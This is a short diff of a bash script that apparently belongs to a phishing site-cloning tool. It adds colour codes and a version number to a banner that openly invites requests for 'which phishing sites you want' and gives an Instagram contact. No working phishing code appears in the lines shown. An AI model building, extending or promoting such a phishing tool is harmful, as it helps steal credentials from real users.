@@ -9,6 +9,8 @@ BLUE="\033[0;34m"
 MAGENTA="\033[0;35m"
 CYAN="\033[0;36m"
 WHITE="\033[0;37m"
+MAGENTA='\033[1;35m'
+YELLOW2='\033[1;33m'
 
 BRIGHT_BLACK="\033[1;90m"
 BRIGHT_RED="\033[1;91m"
@@ -31,11 +33,12 @@ PORT="" # Only once random
 banner() {
     clear
     echo -e "${BRIGHT_CYAN}"
-    echo "      █████▒▒ PHISHER-STYLE SITES CLONE ▒▒█████
+    echo -e "      █████▒▒ PHISHER-STYLE SITES CLONE ▒▒█████
+
+                "  ████▒▒ ${YELLOW2}V1.1${BRIGHT_CYAN} ▒▒████"
     
-    
-    Feedback And Tell Which Phishing Sites You want         
-           Contact Instagram = @Shyam.npl1 "
+  Feedback And Tell Which Phishing Sites You want         
+             Instagram = @Shyam.npl1 "
     echo -e "${NC}"
 }
 
